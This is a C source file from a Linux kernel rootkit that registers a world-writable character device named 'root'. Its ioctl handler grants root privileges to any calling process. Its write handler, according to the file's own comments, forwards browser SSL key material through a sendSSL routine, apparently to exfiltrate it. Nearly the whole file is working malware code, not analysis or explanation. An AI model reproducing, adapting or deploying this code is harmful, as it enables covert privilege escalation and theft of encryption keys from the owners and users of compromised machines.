
/* 
    *This file handles the creation part of the character device creation. 
    *This device allows the rootkit to export the ssl keys for the browser, and to increase the privileges to root level.
*/
    
#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include "socket.c"
#include "taskManipulator.c"
#include <linux/kmod.h>

#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

#define NUM_DEVICES 1
#define CHAR_DEV_CLASS_NAME "root"
#define CHAR_DEV_NAME "root"
#define BUFFER_SIZE 5000

/* IOCTL */
#define ROOTKIT_MAGIC 'R' /* Magic number*/
#define MAKE_ME_ROOT_NO 0x01 /* Command number */
/*
    * “IO“: an ioctl with no parameters
    * “IOW“: an ioctl with write parameters (copy_from_user)
    * “IOR“: an ioctl with read parameters (copy_to_user)
    * “IOWR“: an ioctl with both write and read parameters
*/
/*
    ? The Magic Number is a unique number or character that will differentiate our set of ioctl calls from the other ioctl calls. some times the major number for the device is used here.
    ? Command Number is the number that is assigned to the ioctl. This is used to differentiate the commands from one another.
    ? The last is the type of data.
    * #define WR_VALUE _IOW('a','a',int32_t*)
    * #define RD_VALUE _IOR('a','b',int32_t*)
*/
#define MAKE_ME_ROOT _IO(ROOTKIT_MAGIC, MAKE_ME_ROOT_NO) /* IOCTL */


/* Prototypes */
static int createDevice(void);
static void destroyDevice(void);

static int dummy_open(struct inode * inode, struct file * filp);
static int dummy_release(struct inode * inode, struct file * filp);
static ssize_t dummy_read (struct file *filp, char __user * buf, size_t count,loff_t * offset);
static ssize_t dummy_write(struct file * filp, const char __user * buf, size_t count,loff_t * offset);
static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

static int mychardev_uevent(const struct device *dev, struct kobj_uevent_env *env); /* This function configures Udev*/
static void runReflectiveLoader(void);

// Other files prototypes
static void makeMeRoot(void);
static int sendSSL(char *data,int size);

// Variables
static unsigned int major; /* Major number for device */
static dev_t dev_num; /* Dev number */
/* This struct stores the device class, the devices that are created in this class hang from this class (like a tree) and share the largest number */
static struct class *rootkit_dev_class = NULL; //Sysfs class structure
static struct cdev rootkit_cdev; // Character device struct


/* Buffer Write */
static char bufferWrite [BUFFER_SIZE]; /* Save in stack :D */

/* Struct containing the possible operations on a carachter type device */
static const struct file_operations rootkit_chardev_fops= {
    open:       dummy_open,
    release:    dummy_release,
    read:       dummy_read,
    write:      dummy_write,
    unlocked_ioctl: etx_ioctl,
};

/* Open file function */
static int dummy_open(struct inode * inode, struct file * filp)
{
    #if verbose == 1
        pr_info("Someone tried to open me\n");
    #endif
    return 0;
}

/* Release file function */
static int dummy_release(struct inode * inode, struct file * filp)
{
    #if verbose == 1
        pr_info("Someone closed me\n");
    #endif
    return 0;
}

/*
    * Buf represents the data buffer coming from the user space.
    * Count is the size of the requested transfer.
    * Offset indicates the start position from which data should be written in the file (or in the corresponding memory region if the character device file is memory-backed)
*/
/* Read file function */
static ssize_t dummy_read (struct file *filp, char __user * buf, size_t count,loff_t * offset)
{
    
    #if verbose == 1
        pr_info("Nothing to read\n");
    #endif
    return 0; /* Return number of bytes read */
}

/*
    * Buf represents the data buffer coming from the user space.
    * Count is the size of the requested transfer.
    * Offset indicates the start position from which data should be written in the file (or in the corresponding memory region if the character device file is memory-backed)
*/
/* Write file function */
static ssize_t dummy_write(struct file * filp, const char __user * buf, size_t count,loff_t * offset)
{
    if(count >= BUFFER_SIZE){
        #if verbose == 1
            pr_info("Count greater than buffer size: %d\n",count);
        #endif
        return -EFAULT;
    }
    if (copy_from_user(bufferWrite, buf, count) != 0){
        return -EFAULT;
    }else{
        sendSSL(bufferWrite,count);
    }
    #if verbose == 1
        pr_info("BufferWrite: %s\n",bufferWrite);
    #endif
    return count;
}

/* IOCT driver file functon */
static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    #if verbose == 1
        pr_info("Someone ioctl\n");
    #endif
    switch(cmd){
        case MAKE_ME_ROOT:
            makeMeRoot(); /* Grants root permissions to the calling program */
            break;
        default:
            return -ENOTTY;
    }
    return 0;
}

static int createDevice()
{
    int error;
    dev_t currentDev;
    /* Request for a major number to get a range of minor numbers (starting with 0) to work with */
    error = alloc_chrdev_region(&dev_num, 0, NUM_DEVICES, CHAR_DEV_NAME);
    if (error < 0) {
        #if verbose == 1
            pr_err("Can't get major number\n");
        #endif
        return error;
    }

    major = MAJOR(dev_num);
    #if verbose == 1
        pr_info("dummy_char major number = %d\n",major);
        pr_info("dummy_char minor number = %d\n",MINOR(dev_num));
    #endif

    /* create our device class, visible in /sys/class */
    rootkit_dev_class = class_create(CHAR_DEV_CLASS_NAME);
    if (IS_ERR(rootkit_dev_class)) {
        #if verbose == 1
            pr_err("Error creating sdma test module class.\n");
        #endif
        unregister_chrdev_region(MKDEV(major, 0), NUM_DEVICES);
        return PTR_ERR(rootkit_dev_class);
    }
    /* Call an udev event */
    rootkit_dev_class->dev_uevent = mychardev_uevent;

    /* Initialize the char device and tie a file_operations to it */
    cdev_init(&rootkit_cdev, &rootkit_chardev_fops);
    rootkit_cdev.owner = THIS_MODULE;

    /* Now make the device live for the users to access */
    cdev_add(&rootkit_cdev, dev_num, 1);

    /* Device number to use to add cdev to the core */
    /* With several devices, the i of the for loop is added */
    currentDev = MKDEV(MAJOR(dev_num),MINOR(dev_num));

    /* Create the device in fs */
    struct device *device;
    device = device_create(rootkit_dev_class,
                                NULL,   /* no parent device */
                                dev_num,    /* associated dev_t */
                                NULL,   /* no additional data */
                                CHAR_DEV_NAME);  /* device name */
    if (IS_ERR(device)) {
        #if verbose == 1
            pr_err("Error creating sdma test class device.\n");
        #endif
        class_destroy(rootkit_dev_class);
        unregister_chrdev_region(dev_num, NUM_DEVICES);
        return -1;
    }
     #if verbose == 1
        pr_info("dummy char module loaded\n");
    #endif
    return 0;

}

/* Udev event */
static int mychardev_uevent(const struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0777); /* Tells udev to set read permissions for someone other than root */
    return 0;
}

static void destroyDevice()
{
    unregister_chrdev_region(MKDEV(major, 0), NUM_DEVICES);
    device_destroy(rootkit_dev_class, MKDEV(major, 0));
    cdev_del(&rootkit_cdev);
    class_destroy(rootkit_dev_class);
}